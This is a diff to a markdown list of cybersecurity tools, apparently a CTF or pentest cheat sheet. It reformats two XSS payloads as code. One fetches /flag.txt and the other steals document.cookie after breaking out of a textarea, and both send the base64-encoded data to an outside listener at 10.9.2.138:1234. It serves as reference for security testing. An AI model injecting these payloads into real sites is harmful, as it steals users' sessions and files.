@@ -49,8 +49,8 @@ List of tools/resources for Cybersecurity
   - Kiterunner – Advanced wordlist-based directory busting with support for Swagger/OpenAPI
   - tplmap – Server-side template injection tool
 ### XSS
-  - fetch('/flag.txt').then(res => res.text()).then(data => { fetch('http://10.9.2.138:1234?flag=' + btoa(data));});
-  - </textarea><script>fetch('http://10.9.2.138:1234?cookie=' + btoa(document.cookie) );</script>
+  - ```fetch('/flag.txt').then(res => res.text()).then(data => { fetch('http://10.9.2.138:1234?flag=' + btoa(data));});```
+  - ```</textarea><script>fetch('http://10.9.2.138:1234?cookie=' + btoa(document.cookie) );</script>```
 
 ### Spiders & Path Traversal
 - Feroxbuster
